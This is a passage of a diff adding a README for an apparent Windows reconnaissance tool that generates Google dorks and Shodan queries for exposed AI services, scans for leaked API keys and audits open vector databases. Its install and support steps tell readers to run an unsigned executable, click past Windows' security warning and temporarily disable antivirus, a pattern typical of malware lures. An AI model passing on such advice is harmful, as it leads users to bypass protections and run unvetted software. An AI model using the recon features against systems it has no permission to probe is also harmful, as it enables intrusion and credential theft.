+4.  Save the file to your desktop or downloads folder.
+5.  Double-click the file to start the application.
+
+If Windows shows a security warning about unknown publishers, click "More info" and then "Run anyway." This happens because we provide the software directly without a commercial certificate.
+
+## 🛠 Using the tool
+
+Once the application is open, you will see a dashboard with different tabs. Each tab matches a specific type of search or audit activity.
+
+### Google Dork Generator
+This tool builds complex search terms for Google. Select the target you want to find, such as exposed configuration files or logs. The tool generates the precise syntax for you. Copy the text into your search engine to view the results.
+
+### Shodan Query Builder
+Shodan indexes servers and devices connected to the internet. This feature saves you time by creating queries that look for specific AI service signatures. Paste these queries into the Shodan website to identify unprotected services.
+
+### API Key Scanner
+This section looks for patterns that resemble secret tokens. Many developers publish code to platforms like GitHub without removing these credentials. You can use this scanner to flag files that might contain sensitive information.
+
+### Vector Database Auditor
+Vector databases store the knowledge for many AI agents. If these databases face the public internet without a password, they become an entry point. This tool tests the strength of the configuration.
+
+## 🛡 Security and ethics
+
+Keep your activities within legal boundaries. Only scan systems that you own or have explicit permission to audit. Use this tool to improve security, prevent leaks, and perform responsible research.
+
+Do not use the findings to cause harm or access private user data without authorization. The goal of this software is to foster a safe digital environment for artificial intelligence tools.
+
+## 💡 Frequent questions
+
+**I am not a programmer. Can I use this?**
+Yes. You do not need the ability to write code. The menus and buttons handle the logic behind the scenes.
+
+**Does this tool infect my computer?**
+No. This tool acts as an information gathering assistant. It merely sends search requests to public websites and processes the incoming text.
+
+**Where can I find updates?**
+Return to the release page linked at the top of this document. Check for new versions occasionally to ensure you have the latest search patterns.
+
+**What should I do if a search returns private information?**
+Immediately close the window and do not save or share the data. Contact the system owner and notify them about the exposure in a private manner.
+
+**Can I save my search history?**
+The tool includes a feature to export your search results as a text file. Use the "Save History" button in the menu bar to keep a record of your tasks.
+
+## 📌 Topics covered
+
+This project aligns with modern industry standards for identifying system weaknesses. Our approach includes:
+
+*   Reconnaissance: Gathering information about targets.
+*   Pentesting: Assessing the strength of security controls.
+*   Red Team: Simulating cyber threats to test defenses.
+*   Bug Bounty: Finding issues that companies reward you for reporting.
+*   LLM Security: Protecting large language models from manipulation.
+*   Ollama: Managing local AI models.
+
+## 📞 Support
+
+If the software does not open or crashes, try these basic steps:
+
+1.  Restart the application.
+2.  Make sure your internet connection works.
+3.  Check that you downloaded the correct version for Windows.
+4.  Temporarily disable your antivirus if it blocks the startup process.
+
+We appreciate feedback on your results. If you find a new way to use the provided queries, feel free to contribute to the community.
